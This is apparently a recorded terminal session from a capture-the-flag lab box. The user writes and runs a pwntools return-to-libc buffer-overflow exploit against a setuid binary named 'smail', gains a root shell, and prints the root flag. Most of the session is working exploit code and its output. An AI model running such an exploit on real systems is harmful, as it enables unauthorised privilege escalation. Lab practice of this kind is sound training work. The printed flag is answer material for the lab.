@@ -1,0 +1,137 @@
+Script started on 2026-09-18 12:35:49+03:00 [COMMAND="ssh carlJ@chronicle.thm" TERM="xterm-256color" TTY="/dev/pts/1" COLUMNS="119" LINES="29"]
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+carlJ@chronicle.thm's password: 
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-142-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri Sep 18 09:35:58 UTC 2026
+
+  System load:  0.0               Processes:           108
+  Usage of /:   60.8% of 8.79GB   Users logged in:     0
+  Memory usage: 11%               IP address for ens5: 10.82.141.236
+  Swap usage:   0%
+
+
+73 packages can be updated.
+1 update is a security update.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+*** System restart required ***
+Last login: Sat Apr  3 20:24:03 2021 from 192.168.29.217
+]0;carlJ@incognito: ~[01;32mcarlJ@incognito[00m:[01;34m~[00m$ ls
+[0m[01;34mmailing[0m
+]0;carlJ@incognito: ~[01;32mcarlJ@incognito[00m:[01;34m~[00m$ cd mailing/
+]0;carlJ@incognito: ~/mailing[01;32mcarlJ@incognito[00m:[01;34m~/mailing[00m$ ls
+[0m[37;41msmail[0m
+]0;carlJ@incognito: ~/mailing[01;32mcarlJ@incognito[00m:[01;34m~/mailing[00m$ vim exploit.py
+[?2004h[?1049h[22;0;0t[?1h=[?2004h[1;29r[?12h[?12l[27m[23m[29m[m[H[2J[?25l[29;1H"exploit.py" [New File][2;1H▽[6n[2;1H  [1;1H[>c]10;?]11;?[2;1H[94m~                                                                                                                      [3;1H~                                                                                                                      [4;1H~                                                                                                                      [5;1H~                                                                                                                      [6;1H~                                                                                                                      [7;1H~                                                                                                                      [8;1H~                                                                                                                      [9;1H~                                                                                                                      [10;1H~                                                                                                                      [11;1H~                                                                                                                      [12;1H~                                                                                                                      [13;1H~                                                                                                                      [14;1H~                                                                                                                      [15;1H~                                                                                                                      [16;1H~                                                                                                                      [17;1H~                                                                                                                      [18;1H~                                                                                                                      [19;1H~                                                                                                                      [20;1H~                                                                                                                      [21;1H~                                                                                                                      [22;1H~                                                                                                                      [23;1H~                                                                                                                      [24;1H~                                                                                                                      [25;1H~                                                                                                                      [26;1H~                                                                                                                      [27;1H~                                                                                                                      [28;1H~                                                                                                                      [m[29;102H0,0-1[9CAll[1;1H[?25h[?12$p[?25l[29;92H/[1;1H[29;93H1[1;1H[29;94H1[1;1H[29;95H1[1;1H[29;96H1[1;1H[29;97H/[1;1H[29;98H1[1;1H[29;99H7[1;1H[29;100H1[1;1H[29;101H7[1;1H[29;92H          [1;1H[27m[23m[29m[m[H[2J[2;1H[94m~                                                                                                                      [3;1H~                                                                                                                      [4;1H~                                                                                                                      [5;1H~                                                                                                                      [6;1H~                                                                                                                      [7;1H~                                                                                                                      [8;1H~                                                                                                                      [9;1H~                                                                                                                      [10;1H~                                                                                                                      [11;1H~                                                                                                                      [12;1H~                                                                                                                      [13;1H~                                                                                                                      [14;1H~                                                                                                                      [15;1H~                                                                                                                      [16;1H~                                                                                                                      [17;1H~                                                                                                                      [18;1H~                                                                                                                      [19;1H~                                                                                                                      [20;1H~                                                                                                                      [21;1H~                                                                                                                      [22;1H~                                                                                                                      [23;1H~                                                                                                                      [24;1H~                                                                                                                      [25;1H~                                                                                                                      [26;1H~                                                                                                                      [27;1H~                                                                                                                      [28;1H~                                                                                                                      [m[29;102H0,0-1[9CAll"exploit.py" [New File][1;1H[?25h[?25l[29;92Hi[1;1H[29;92H [1;1H[29;1H[1m-- INSERT --[m[29;14H[K[29;102H0,1[11CAll[1;1H[?25h[?25l[38;5;81mfrom[m pwn [38;5;81mimport[m *[2;1H[K[3;1Hp = process([95m'./smail'[m)[3;23H[K[4;1H[K[5;1Hlibc_base = [95m0x7ffff[m[5;20H[K[5;20H[?25h[?25l[95m79e2000[m
+syst[6;5H[K[6;5H[?25h[?25lem = libc_base +[?25h[?25l [95m0x4f550[m
+binsh= libc_base + [95m0x1b3e1a[m[7;28H[K[8;1H[K[9;1HPOPRDI=[95m0x4007f3[m[9;16H[K[10;1H[K[11;1Hpa[11;3H[K[11;3H[?25h[?25lyload = b[95m'A'[m * [95m72[m
+payload += p64([95m0x4005[m[12;22H[K[12;22H[?25h[?25l[95m56[m)
+payload += p64(POPRDI)[13;23H[K[14;1Hpayload += p64(binsh)[14;22H[K[15;1Hpayload += p64(sys[15;19H[K[15;19H[?25h[?25ltem)
+payload += p64([95m0x0[m)[16;20H[K[17;1H[K[18;1Hp.clean()[18;10H[K[19;1Hp.sendline([95m"2"[m)[19;16H[K[20;1Hp.clean()[20;10H[K[21;1Hp.s[21;4H[K[21;4H[?25h[?25lendline(payload)
+p.interactive()[22;16H[K[22;14H[46m()[m[29;102H22,16[22;16H[?25h[29;1H[K[22;15H[?25l[29;92H^[[22;15H[29;92H  [22;16H[29;102H22,15[9CAll[22;15H[?25h[?25l[29;92H:[22;15H[29;92H[K[29;1H:[?2004h[?25hx[?25l[?25h[?25l[?2004l"exploit.py" [New] 22L, 351C written
+[?2004l[?1l>[?25h[?1049l[23;0;0t]0;carlJ@incognito: ~/mailing[01;32mcarlJ@incognito[00m:[01;34m~/mailing[00m$ ls
+exploit.py  [0m[37;41msmail[0m
+]0;carlJ@incognito: ~/mailing[01;32mcarlJ@incognito[00m:[01;34m~/mailing[00m$ python exploit.py 
+
+Command 'python' not found, but can be installed with:
+
+apt install python3       
+apt install python        
+apt install python-minimal
+
+Ask your administrator to install one of them.
+
+You also have python3 installed, you can run 'python3' instead.
+
+]0;carlJ@incognito: ~/mailing[01;32mcarlJ@incognito[00m:[01;34m~/mailing[00m$ python exploit.py [C[C[C[C[C[C[1@3
+[?25l[?1h=[6n[[1m[34m*[m] Checking for new versions of pwntools[K
+    To disable this functionality, set the contents of /home/carlJ/.cache/.pwntools-cache-3.6/update to 'never' (old way).[K
+    Or add the following lines to ~/.pwn.conf (or /etc/pwn.conf system-wide):[K
+        [update][K
+        interval=never[K
+[?12l[?25h[?1l> Traceback (most recent call last):[K
+  File "exploit.py", line 1, in <module>[K
+    from pwn import *[K
+  File "/usr/local/lib/python3.6/dist-packages/pwn/__init__.py", line 20, in <module>[K
+    pwnlib.update.check_automatically()[K
+  File "/usr/local/lib/python3.6/dist-packages/pwnlib/update.py", line 200, in check_automatically[K
+    perform_check()[K
+  File "/usr/local/lib/python3.6/dist-packages/pwnlib/update.py", line 155, in perform_check[K
+    pypi = available_on_pypi(prerelease)[K
+  File "/usr/local/lib/python3.6/dist-packages/pwnlib/update.py", line 80, in available_on_pypi[K
+    versions = client.package_releases('pwntools', True)[K
+  File "/usr/lib/python3.6/xmlrpc/client.py", line 1112, in __call__[K
+    return self.__send(self.__name, args)[K
+  File "/usr/lib/python3.6/xmlrpc/client.py", line 1452, in __request[K
+    verbose=self.__verbose[K
+  File "/usr/lib/python3.6/xmlrpc/client.py", line 1154, in request[K
+    return self.single_request(host, handler, request_body, verbose)[K
+  File "/usr/lib/python3.6/xmlrpc/client.py", line 1166, in single_request[K
+    http_conn = self.send_request(host, handler, request_body, verbose)[K
+  File "/usr/lib/python3.6/xmlrpc/client.py", line 1279, in send_request[K
+    self.send_content(connection, request_body)[K
+  File "/usr/lib/python3.6/xmlrpc/client.py", line 1309, in send_content[K
+    connection.endheaders(request_body)[K
+  File "/usr/lib/python3.6/http/client.py", line 1276, in endheaders[K
+    self._send_output(message_body, encode_chunked=encode_chunked)[K
+  File "/usr/lib/python3.6/http/client.py", line 1042, in _send_output[K
+    self.send(msg)[K
+  File "/usr/lib/python3.6/http/client.py", line 980, in send[K
+    self.connect()[K
+  File "/usr/lib/python3.6/http/client.py", line 1434, in connect[K
+    super().connect()[K
+  File "/usr/lib/python3.6/http/client.py", line 952, in connect[K
+    (self.host,self.port), self.timeout, self.source_address)[K
+  File "/usr/lib/python3.6/socket.py", line 713, in create_connection[K
+    sock.connect(sa)[K
+KeyboardInterrupt[K
+[?12l[?25h[?1l> ]0;carlJ@incognito: ~/mailing[01;32mcarlJ@incognito[00m:[01;34m~/mailing[00m$ cat /home/carlJ/.cache/.pwntools-cache-3.6/update
+]0;carlJ@incognito: ~/mailing[01;32mcarlJ@incognito[00m:[01;34m~/mailing[00m$ vim /home/carlJ/.cache/.pwntools-cache-3.6/update
+[?2004h[?1049h[22;0;0t[?1h=[?2004h[1;29r[?12h[?12l[27m[23m[29m[m[H[2J[?25l[29;1H"~/.cache/.pwntools-cache-3.6/update" 0L, 0C[2;1H▽[6n[2;1H  [1;1H[>c]10;?]11;?[2;1H[94m~                                                                                                                      [3;1H~                                                                                                                      [4;1H~                                                                                                                      [5;1H~                                                                                                                      [6;1H~                                                                                                                      [7;1H~                                                                                                                      [8;1H~                                                                                                                      [9;1H~                                                                                                                      [10;1H~                                                                                                                      [11;1H~                                                                                                                      [12;1H~                                                                                                                      [13;1H~                                                                                                                      [14;1H~                                                                                                                      [15;1H~                                                                                                                      [16;1H~                                                                                                                      [17;1H~                                                                                                                      [18;1H~                                                                                                                      [19;1H~                                                                                                                      [20;1H~                                                                                                                      [21;1H~                                                                                                                      [22;1H~                                                                                                                      [23;1H~                                                                                                                      [24;1H~                                                                                                                      [25;1H~                                                                                                                      [26;1H~                                                                                                                      [27;1H~                                                                                                                      [28;1H~                                                                                                                      [m[29;102H0,0-1[9CAll[1;1H[?25h[?12$p[27m[23m[29m[m[H[2J[?25l[2;1H[94m~                                                                                                                      [3;1H~                                                                                                                      [4;1H~                                                                                                                      [5;1H~                                                                                                                      [6;1H~                                                                                                                      [7;1H~                                                                                                                      [8;1H~                                                                                                                      [9;1H~                                                                                                                      [10;1H~                                                                                                                      [11;1H~                                                                                                                      [12;1H~                                                                                                                      [13;1H~                                                                                                                      [14;1H~                                                                                                                      [15;1H~                                                                                                                      [16;1H~                                                                                                                      [17;1H~                                                                                                                      [18;1H~                                                                                                                      [19;1H~                                                                                                                      [20;1H~                                                                                                                      [21;1H~                                                                                                                      [22;1H~                                                                                                                      [23;1H~                                                                                                                      [24;1H~                                                                                                                      [25;1H~                                                                                                                      [26;1H~                                                                                                                      [27;1H~                                                                                                                      [28;1H~                                                                                                                      [m[29;102H0,0-1[9CAll"~/.cache/.pwntools-cache-3.6/update" 0L, 0C[1;1H[?25h[?25l[29;92Hi[1;1H[29;92H [1;1H[29;1H[1m-- INSERT --[m[29;13H[K[29;102H0,1[11CAll[1;1H[?25h[?25ln[29;102H1,2[1;2H[?25h[?25le[29;104H3[1;3H[?25h[?25lv[29;104H4[1;4H[?25h[?25le[29;104H5[1;5H[?25h[?25lr[29;104H6[1;6H[?25h[29;1H[K[1;5H[?25l[29;92H^[[1;5H[29;92H  [1;6H[29;102H1,5[11CAll[1;5H[?25h[?25l[29;92H:[1;5H[29;92H[K[29;1H:[?2004h[?25hx[?25l[?25h[?25l[?2004l"~/.cache/.pwntools-cache-3.6/update" 1L, 6C written
+[?2004l[?1l>[?25h[?1049l[23;0;0t]0;carlJ@incognito: ~/mailing[01;32mcarlJ@incognito[00m:[01;34m~/mailing[00m$ vim /home/carlJ/.cache/.pwntools-cache-3.6/update[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccat[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+never
+]0;carlJ@incognito: ~/mailing[01;32mcarlJ@incognito[00m:[01;34m~/mailing[00m$ cat /home/carlJ/.cache/.pwntools-cache-3.6/update[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cvim[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccat[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[30Ppython3 exploit.py 
+[?25l[?1h=[6nStarting local process './smail'[K
+[28;1H[[1m[34m|[m] Starting local process './smail'[K
+[J[28;5HStarting local process './smail': pid 13280[K
+[J[28;1H[[1m[32m+[m] [29;1H[J[[1m[34m*[m] Switching to interactive mode[K
+[1m[31m$[m [29;3H[7m [m[J[29;1HChanged[K
+[1m[31m$[m [7m [m[J[29;3Hi[7m [m[J[29;3Hid[7m [m[J[29;3Hid[K
+[J[1m[31m$[m [29;3H[7m [m[J[29;1Huid=0(root) gid=1002(carlJ) groups=1002(carlJ)[K
+[1m[31m$[m [7m [m[J[29;3Hc[7m [m[J[29;3Hcd[7m [m[J[29;3Hcd [7m [m[J[29;3Hcd /[7m [m[J[29;3Hcd /r[7m [m[J[29;3Hcd /ro[7m [m[J[29;3Hcd /roo[7m [m[J[29;3Hcd /root[7m [m[J[29;3Hcd /root[K
+[J[1m[31m$[m [29;3H[7m [m[J[29;3Hl[7m [m[J[29;3Hls[7m [m[J[29;3Hls[K
+[J[1m[31m$[m [29;3H[7m [m[J[29;1Hroot.txt[K
+[1m[31m$[m [7m [m[J[29;3Ha[7m [m[J[29;3H[7m [m[J[29;3Hc[7m [m[J[29;3Hca[7m [m[J[29;3Hcat[7m [m[J[29;3Hcat [7m [m[J[29;3Hcat r[7m [m[J[29;3Hcat ro[7m [m[J[29;3Hcat roo[7m [m[J[29;3Hcat root[7m [m[J[29;3Hcat root.[7m [m[J[29;3Hcat root.t[7m [m[J[29;3Hcat root.tx[7m [m[J[29;3Hcat root.txt[7m [m[J[29;3Hcat root.txt[K
+[J[1m[31m$[m [29;3H[7m [m[J[29;1Hf21979de76c0302154cc001884143ab2[K
+[1m[31m$[m [7m [m[J[29;3He[7m [m[J[29;3Hex[7m [m[J[29;3He[7m [m[J[29;3H[7m [m[J[29;3Hl[7m [m[J[29;3Hls[7m [m[J[29;3Hls[K
+[J[1m[31m$[m [29;3H[7m [m[J[29;1Hroot.txt[K
+[1m[31m$[m [7m [m[J[29;3Hl[7m [m[J[29;3Hls[7m [m[J[29;3Hls [7m [m[J[29;3Hls -[7m [m[J[29;3Hls -a[7m [m[J[29;3Hls -al[7m [m[J[29;3Hls -al[K
+[J[1m[31m$[m [29;3H[7m [m[J[29;1Htotal 32[K
+[1m[31m$[m [7m [m[J[29;1Hdrwx------  5 root root 4096 Apr 16  2021 .[K
+drwxr-xr-x 26 root root 4096 Sep 18 09:27 ..[K
+lrwxrwxrwx  1 root root    9 Apr  3  2021 .bash_history -> /dev/null[K
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc[K
+drwx------  3 root root 4096 Apr 16  2021 .cache[K
+drwx------  3 root root 4096 Apr 16  2021 .gnupg[K
+drwxr-xr-x  3 root root 4096 Apr  3  2021 .local[K
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile[K
+-rw-r--r--  1 root root   33 Apr  3  2021 root.txt[K
+[1m[31m$[m [7m [m[J[29;3He[7m [m[J[29;3Hex[7m [m[J[29;3Hexi[7m [m[J[29;3Hexit[7m [m[J[29;3Hexit[K
+[J[1m[31m$[m [29;3H[7m [m[J[29;1H[[1m[34m*[m] Got EOF while reading in interactive[1m[31m$[m [7m [m[J[29;41H[K
+[1m[31m$[m [7m [m[J[29;3Hr[7m [m[J[29;3Hri[7m [m[J[29;3Hr[7m [m[J[29;3H[7m [m[J[29;3He[7m [m[J[29;3Hex[7m [m[J[29;3Hexi[7m [m[J[29;3Hexit[7m [m[J[29;3Hexit[K
+[J[[1m[34m*[m] Process './smail' stopped with exit code -11 (SIGSEGV) (pid 13280)[K
+[[1m[34m*[m] Got EOF while sending in interactive[K
+[?12l[?25h[?1l> ]0;carlJ@incognito: ~/mailing[01;32mcarlJ@incognito[00m:[01;34m~/mailing[00m$ cv[K[Kexit
+logout
+Connection to chronicle.thm closed.
+
+Script done on 2026-09-18 12:43:15+03:00 [COMMAND_EXIT_CODE="0"]
